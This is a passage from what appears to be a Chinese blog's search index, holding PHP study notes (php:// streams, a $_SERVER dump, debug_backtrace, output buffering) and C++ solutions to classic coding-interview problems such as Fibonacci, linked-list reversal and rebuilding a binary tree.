<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>php学习笔记</title>
    <url>/2019/12/11/2019-12-11-php/</url>
    <content><![CDATA[<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p><a href="https://www.php.net/docs.php" target="_blank" rel="noopener">官方文档</a></p><h2 id="内置定义"><a href="#内置定义" class="headerlink" title="内置定义"></a>内置定义</h2><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><h4 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_put_contents(<span class="string">"xxx"</span>, <span class="string">"xxx"</span> . PHP_EOL);      <span class="comment">// PHP_EOL根据系统决定的/r/n还是/n换行符</span></span><br><span class="line"><span class="comment">// 同C一样有行数函数和文件的定义</span></span><br><span class="line">file_put_contents(<span class="string">"xxx"</span>, <span class="string">"xxx"</span> . <span class="keyword">__LINE__</span>);    </span><br><span class="line">file_put_contents(<span class="string">"xxx"</span>, <span class="string">"xxx"</span> . <span class="keyword">__FUNCTION__</span>);    </span><br><span class="line">file_put_contents(<span class="string">"xxx"</span>, <span class="string">"xxx"</span> . <span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><h4 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_put_contents(<span class="string">"php://stdout"</span>, <span class="string">"xxx"</span>);   <span class="comment">// 输出到标准输出</span></span><br><span class="line">file_put_contents(<span class="string">"php://output"</span>, <span class="string">"xxx"</span>);   <span class="comment">// 输出到结果输出（浏览器返回）</span></span><br><span class="line">file_get_contents(<span class="string">"php://stdin"</span>);           <span class="comment">// 获取标准输入</span></span><br></pre></td></tr></table></figure><h4 id="服务器相关"><a href="#服务器相关" class="headerlink" title="服务器相关"></a>服务器相关</h4><h5 id="SERVER-服务器相关信息"><a href="#SERVER-服务器相关信息" class="headerlink" title="$_SERVER 服务器相关信息"></a>$_SERVER 服务器相关信息</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> json_encode($_SERVER);</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">"USER"</span>: <span class="string">"wangyubo"</span>,</span><br><span class="line">	<span class="attr">"HOME"</span>: <span class="string">"/home/wangyubo"</span>,</span><br><span class="line">	<span class="attr">"HTTP_ACCEPT_LANGUAGE"</span>: <span class="string">"zh-CN,zh;q=0.9"</span>,</span><br><span class="line">	<span class="attr">"HTTP_ACCEPT_ENCODING"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">	<span class="attr">"HTTP_ACCEPT"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"</span>,</span><br><span class="line">	<span class="attr">"HTTP_USER_AGENT"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36"</span>,</span><br><span class="line">	<span class="attr">"HTTP_UPGRADE_INSECURE_REQUESTS"</span>: <span class="string">"1"</span>,</span><br><span class="line">	<span class="attr">"HTTP_CACHE_CONTROL"</span>: <span class="string">"max-age=0"</span>,</span><br><span class="line">	<span class="attr">"HTTP_CONNECTION"</span>: <span class="string">"keep-alive"</span>,</span><br><span class="line">	<span class="attr">"HTTP_HOST"</span>: <span class="string">"10.240.17.107:8082"</span>,</span><br><span class="line">	<span class="attr">"REDIRECT_STATUS"</span>: <span class="string">"200"</span>,</span><br><span class="line">	<span class="attr">"SERVER_NAME"</span>: <span class="string">"localhost"</span>,</span><br><span class="line">	<span class="attr">"SERVER_PORT"</span>: <span class="string">"8082"</span>,</span><br><span class="line">	<span class="attr">"SERVER_ADDR"</span>: <span class="string">"10.240.17.107"</span>,</span><br><span class="line">	<span class="attr">"REMOTE_PORT"</span>: <span class="string">"50539"</span>,</span><br><span class="line">	<span class="attr">"REMOTE_ADDR"</span>: <span class="string">"172.22.72.133"</span>,</span><br><span class="line">	<span class="attr">"SERVER_SOFTWARE"</span>: <span class="string">"nginx/1.10.3"</span>,</span><br><span class="line">	<span class="attr">"GATEWAY_INTERFACE"</span>: <span class="string">"CGI/1.1"</span>,</span><br><span class="line">	<span class="attr">"REQUEST_SCHEME"</span>: <span class="string">"http"</span>,</span><br><span class="line">	<span class="attr">"SERVER_PROTOCOL"</span>: <span class="string">"HTTP/1.1"</span>,</span><br><span class="line">	<span class="attr">"DOCUMENT_ROOT"</span>: <span class="string">"/home/wangyubo/work/codeFiles/php/www"</span>,</span><br><span class="line">	<span class="attr">"DOCUMENT_URI"</span>: <span class="string">"/index.php"</span>,</span><br><span class="line">	<span class="attr">"REQUEST_URI"</span>: <span class="string">"/"</span>,</span><br><span class="line">	<span class="attr">"SCRIPT_NAME"</span>: <span class="string">"/index.php"</span>,</span><br><span class="line">	<span class="attr">"CONTENT_LENGTH"</span>: <span class="string">""</span>,</span><br><span class="line">	<span class="attr">"CONTENT_TYPE"</span>: <span class="string">""</span>,</span><br><span class="line">	<span class="attr">"REQUEST_METHOD"</span>: <span class="string">"GET"</span>,</span><br><span class="line">	<span class="attr">"QUERY_STRING"</span>: <span class="string">""</span>,</span><br><span class="line">	<span class="attr">"SCRIPT_FILENAME"</span>: <span class="string">"/home/wangyubo/work/codeFiles/php/www/index.php"</span>,</span><br><span class="line">	<span class="attr">"PATH_INFO"</span>: <span class="string">""</span>,</span><br><span class="line">	<span class="attr">"FCGI_ROLE"</span>: <span class="string">"RESPONDER"</span>,</span><br><span class="line">	<span class="attr">"PHP_SELF"</span>: <span class="string">"/index.php"</span>,</span><br><span class="line">	<span class="attr">"REQUEST_TIME_FLOAT"</span>: <span class="number">1576150192.5111</span>,</span><br><span class="line">	<span class="attr">"REQUEST_TIME"</span>: <span class="number">1576150192</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="POST-请求参数"><a href="#POST-请求参数" class="headerlink" title="$_POST 请求参数"></a>$_POST 请求参数</h5><p>请求参数都会存放在$_POST中</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="堆栈信息-debug-backtrace"><a href="#堆栈信息-debug-backtrace" class="headerlink" title="堆栈信息 debug_backtrace()"></a>堆栈信息 debug_backtrace()</h4><ul><li>参数只有一个，堆栈深度</li><li>返回数组类型的结果，var_dump如下</li></ul><p>代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    var_dump(debug_backtrace());</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    myFunc1();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc3</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    myFunc2();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunc4</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    myFunc3();</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myFunc4();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(3) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  array(4) &#123;</span><br><span class="line">    [&quot;file&quot;]&#x3D;&gt;</span><br><span class="line">    string(21) &quot;&#x2F;home&#x2F;ubuntu&#x2F;test.php&quot;</span><br><span class="line">    [&quot;line&quot;]&#x3D;&gt;</span><br><span class="line">    int(9)</span><br><span class="line">    [&quot;function&quot;]&#x3D;&gt;</span><br><span class="line">    string(7) &quot;myFunc1&quot;</span><br><span class="line">    [&quot;args&quot;]&#x3D;&gt;</span><br><span class="line">    array(0) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  array(4) &#123;</span><br><span class="line">    [&quot;file&quot;]&#x3D;&gt;</span><br><span class="line">    string(21) &quot;&#x2F;home&#x2F;ubuntu&#x2F;test.php&quot;</span><br><span class="line">    [&quot;line&quot;]&#x3D;&gt;</span><br><span class="line">    int(14)</span><br><span class="line">    [&quot;function&quot;]&#x3D;&gt;</span><br><span class="line">    string(7) &quot;myFunc2&quot;</span><br><span class="line">    [&quot;args&quot;]&#x3D;&gt;</span><br><span class="line">    array(0) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  array(4) &#123;</span><br><span class="line">    [&quot;file&quot;]&#x3D;&gt;</span><br><span class="line">    string(21) &quot;&#x2F;home&#x2F;ubuntu&#x2F;test.php&quot;</span><br><span class="line">    [&quot;line&quot;]&#x3D;&gt;</span><br><span class="line">    int(18)</span><br><span class="line">    [&quot;function&quot;]&#x3D;&gt;</span><br><span class="line">    string(7) &quot;myFunc3&quot;</span><br><span class="line">    [&quot;args&quot;]&#x3D;&gt;</span><br><span class="line">    array(0) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h1><h2 id="捕获标准输出函数"><a href="#捕获标准输出函数" class="headerlink" title="捕获标准输出函数"></a>捕获标准输出函数</h2><p>许多函数的输出直接到标准输出，无法存入变量处理，可以使用ob_start()函数进行捕获</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ob_start();</span><br><span class="line">debug_print_backtrace();</span><br><span class="line">$trace = ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br></pre></td></tr></table></figure><h2 id="重定向标准输出"><a href="#重定向标准输出" class="headerlink" title="重定向标准输出"></a>重定向标准输出</h2><p>php内置有几个标准输出变量，如$STDOUT、$STDERR等，实质上是文件句柄</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define(<span class="string">'STDERR'</span>, fopen(<span class="string">'php://stderr'</span>, <span class="string">'w'</span>));</span><br></pre></td></tr></table></figure><p>所以重定向很简单</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@fclose(STDERR);</span><br><span class="line">$STDERR = fopen(<span class="string">"xxx"</span>, <span class="string">"a"</span>);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>编程题思路记录</title>
    <url>/2019/10/21/2019-10-21-programQuestion/</url>
    <content><![CDATA[<h1 id="二维数组查找"><a href="#二维数组查找" class="headerlink" title="二维数组查找"></a>二维数组查找</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>从右侧最上方开始，查到小于后，竖着找大于的，然后横着，直到数组溢出或者找到为止</p><h1 id="斐波那切数列输出"><a href="#斐波那切数列输出" class="headerlink" title="斐波那切数列输出"></a><span id="H2">斐波那切数列输出</span></h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>大家都知道斐波那契数列，现在要求输入一个整数n，请你输出斐波那契数列的第n项（从0开始，第0项为0）。<br>n&lt;=39</p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><h3 id="硬解"><a href="#硬解" class="headerlink" title="硬解"></a>硬解</h3><p>保存前一次和前前一次，一步一步算</p><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><ul><li>每次计算中直接调用自己的<code>n - 1</code>和<code>n - 2</code>的值</li><li>防止递归过大，预留一个40的int数组，如果数组相应索引有值直接返回，没值递归算出保存返回</li></ul><h3 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h3><ul><li>两个变量，g保存当前和前一次，f保存前一次和前两次</li><li>计算方法</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">Fibonacci</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> f = <span class="number">0</span>, g = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(n--) &#123;</span><br><span class="line">            g += f;     <span class="comment">//从前一次到当前</span></span><br><span class="line">            f = g - f;  <span class="comment">//从前两次算到前一次</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="青蛙跳台阶"><a href="#青蛙跳台阶" class="headerlink" title="青蛙跳台阶"></a><span id="H4">青蛙跳台阶</span></h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级。求该青蛙跳上一个n级的台阶总共有多少种跳法（先后次序不同算不同的结果）。</p><h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>青蛙跳n阶台阶，从第一跳来算:</p><ul><li>第一次跳1阶，剩下种类为$f(n - 1)$</li><li>第一次跳2阶，剩下种类为$f(n - 2)$</li></ul><p>则</p><p>$$f(n) = f(n - 1) + f(n - 2)$$</p><p>其中</p><p>$$f(0) = 0, f(1) = 1，f(2) = 2$$</p><p>分析可以看出和<a href="#H2">斐波那切数列输出</a>除了初始值基本一致</p><h1 id="两个栈实现队列"><a href="#两个栈实现队列" class="headerlink" title="两个栈实现队列"></a>两个栈实现队列</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>用两个栈来实现一个队列，完成队列的Push和Pop操作。 队列中的元素为int类型。</p><h2 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h2><ul><li>stack1为入队列栈，stack2为出队列栈</li><li>stack2不为空时直接出栈，为空则从stack1取所有元素</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> node)</span> </span>&#123;</span><br><span class="line">        stack1.push(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//为空才从stack1拿数据</span></span><br><span class="line">        <span class="keyword">if</span> (stack2.empty()) &#123;</span><br><span class="line">            <span class="comment">//stack1也是空的，就返回-1</span></span><br><span class="line">            <span class="keyword">if</span> (stack1.empty()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (!stack1.empty()) &#123;</span><br><span class="line">                stack2.push(stack1.top());</span><br><span class="line">                stack1.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> result = stack2.top();</span><br><span class="line">        stack2.pop();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; stack1;  <span class="comment">//入队列</span></span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; stack2;  <span class="comment">//出队列</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="旋转数组查找最小值"><a href="#旋转数组查找最小值" class="headerlink" title="旋转数组查找最小值"></a>旋转数组查找最小值</h1><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><p>把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。<br>输入一个非递减排序的数组的一个旋转，输出旋转数组的最小元素。<br>例如数组{3,4,5,1,2}为{1,2,3,4,5}的一个旋转，该数组的最小值为1。<br>NOTE：给出的所有元素都大于0，若数组大小为0，请返回0。</p><h2 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h2><ul><li>数组旋转后，最小值为分界点的值，利用二分查找方式最快到达最小值输出。</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">minNumberInRotateArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; rotateArray)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (rotateArray.empty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> left = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> right = rotateArray.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//另类的二分查找，比左边的大，左边等，比右边的小，右边等</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = (left + right) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (tmp == left) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (rotateArray[tmp] &gt;= rotateArray[left]) &#123;</span><br><span class="line">                left = tmp;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                right = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (rotateArray[left] &lt; rotateArray[right]) &#123;</span><br><span class="line">            <span class="keyword">return</span> rotateArray[left];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> rotateArray[right];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="变态跳台阶的问题"><a href="#变态跳台阶的问题" class="headerlink" title="变态跳台阶的问题"></a>变态跳台阶的问题</h1><h2 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h2><p>一只青蛙一次可以跳上1级台阶，也可以跳上2级……它也可以跳上n级。求该青蛙跳上一个n级的台阶总共有多少种跳法。</p><h2 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h2><ul><li>数学统计题，$f(n) = f(n - 1) + f(n - 2) + … + f(1) + 1 = 2^{n - 1}$</li><li>使用<code>1 &lt;&lt; (number - 1)</code>计算2的<code>n - 1</code>次幂更快</li></ul><h1 id="重建二叉树"><a href="#重建二叉树" class="headerlink" title="重建二叉树"></a>重建二叉树</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建二叉树并返回。</p><h2 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h2><ul><li>中序遍历的头结点左边为左子树，右边为右子树</li><li>前序遍历第一个为头结点</li><li>两个结合，找到头结点在中序遍历中的位置，左边递归出来为左子树，右边递归出来为右子树</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> TreeNode* <span class="title">reConstructBinaryTree</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; pre,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vin)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pre.<span class="built_in">size</span>() != vin.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> reConstructBinaryTree(pre.<span class="built_in">begin</span>().base(), vin.<span class="built_in">begin</span>().base(), pre.<span class="built_in">size</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> TreeNode* <span class="title">reConstructBinaryTree</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> *pre, <span class="keyword">const</span> <span class="keyword">int</span> *vin, <span class="keyword">int</span> <span class="built_in">size</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">size</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//头结点从pre第一个取</span></span><br><span class="line">        <span class="keyword">auto</span> head = <span class="keyword">new</span> TreeNode(pre[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">//找到和vin中和pre[0]相等的点，左边为左子树，右边为右子树</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">size</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (vin[i] == pre[<span class="number">0</span>]) &#123;</span><br><span class="line">                head-&gt;left = reConstructBinaryTree(pre + <span class="number">1</span>, vin, i);</span><br><span class="line">                head-&gt;right = reConstructBinaryTree(pre + i + <span class="number">1</span>, vin + i + <span class="number">1</span>, <span class="built_in">size</span> - i - <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="链表倒数第k个值"><a href="#链表倒数第k个值" class="headerlink" title="链表倒数第k个值"></a>链表倒数第k个值</h1><h2 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h2><p>输入一个链表，输出该链表中倒数第k个结点。</p><h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><ul><li>两个指针，一个比另一个先走k步，直到遍历完整个链表返回第二个指针</li></ul><h1 id="链表翻转"><a href="#链表翻转" class="headerlink" title="链表翻转"></a>链表翻转</h1><h2 id="题目-7"><a href="#题目-7" class="headerlink" title="题目"></a>题目</h2><p>输入一个链表，反转链表后，输出新链表的表头。</p><h2 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h2><ul><li>三个指针，一个遍历，一个翻转next，一个保存前一个节点</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> ListNode* <span class="title">ReverseList</span><span class="params">(ListNode* pHead)</span> </span>&#123;</span><br><span class="line">        ListNode *p1 = <span class="literal">nullptr</span>;     <span class="comment">//跟在后面翻转next的指针</span></span><br><span class="line">        ListNode *p2 = <span class="literal">nullptr</span>;     <span class="comment">//保存前一次</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (pHead != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            p2 = p1;</span><br><span class="line">            p1 = pHead;</span><br><span class="line">            pHead = pHead-&gt;next;</span><br><span class="line">            p1-&gt;next = p2;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> p1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="矩形覆盖"><a href="#矩形覆盖" class="headerlink" title="矩形覆盖"></a>矩形覆盖</h1><h2 id="问题-1"><a href="#问题-1" class="headerlink" title="问题"></a>问题</h2><p>我们可以用2<em>1的小矩形横着或者竖着去覆盖更大的矩形。请问用n个2</em>1的小矩形无重叠地覆盖一个2*n的大矩形，总共有多少种方法？</p><h2 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h2><ul><li>分析一下，相当于<a href="#H4">青蛙跳台阶</a>，竖着放就是跳一阶，横着放就是跳两阶</li></ul><h1 id="调整数组中奇数位于偶数前面"><a href="#调整数组中奇数位于偶数前面" class="headerlink" title="调整数组中奇数位于偶数前面"></a>调整数组中奇数位于偶数前面</h1><h2 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h2><p>输入一个整数数组，实现一个函数来调整该数组中数字的顺序，使得所有的奇数位于数组的前半部分，所有的偶数位于数组的后半部分，并保证奇数和奇数，偶数和偶数之间的相对位置不变。</p><h2 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h2><h3 id="硬解-1"><a href="#硬解-1" class="headerlink" title="硬解"></a>硬解</h3><ul><li>查找到第一个偶数和后面第一个奇数</li><li>将中间的偶数后移一位，奇数前移到偶数的位置</li><li>编译直到完成</li></ul><h3 id="另加队列"><a href="#另加队列" class="headerlink" title="另加队列"></a>另加队列</h3><ul><li>遍历，偶数放入新队列，奇数前移</li><li>遍历完后拷贝新队列到老队列最后一个奇数后面</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reOrderArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;<span class="built_in">array</span>)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; Odd;     <span class="comment">//偶数队列</span></span><br><span class="line">        <span class="keyword">int</span> <span class="built_in">size</span> = <span class="built_in">array</span>.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;              <span class="comment">//保存最后待放偶数的位置</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">size</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="built_in">array</span>[i] % <span class="number">2</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//偶数加到新队列</span></span><br><span class="line">                Odd.emplace_back(<span class="built_in">array</span>[i]);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i != j) &#123;</span><br><span class="line">                <span class="comment">//奇数前移</span></span><br><span class="line">                <span class="built_in">array</span>[j] = <span class="built_in">array</span>[i];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ++j;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(<span class="built_in">array</span>.<span class="built_in">begin</span>().base() + j, Odd.<span class="built_in">begin</span>().base(), Odd.<span class="built_in">size</span>() * <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="标准库-stable-partition"><a href="#标准库-stable-partition" class="headerlink" title="标准库 stable_partition"></a>标准库 stable_partition</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reOrderArray</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;<span class="built_in">array</span>)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 奇数放前面，偶数放后面，两边分别的相对位置保持不变</span></span><br><span class="line">        stable_partition(<span class="built_in">array</span>.<span class="built_in">begin</span>(), <span class="built_in">array</span>.<span class="built_in">end</span>(),</span><br><span class="line">                            [](<span class="keyword">const</span> <span class="keyword">int</span> &amp;value) &#123; <span class="keyword">return</span> (value % <span class="number">2</span> == <span class="number">1</span>); &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="数值的整数次幂"><a href="#数值的整数次幂" class="headerlink" title="数值的整数次幂"></a>数值的整数次幂</h1><h2 id="题目-9"><a href="#题目-9" class="headerlink" 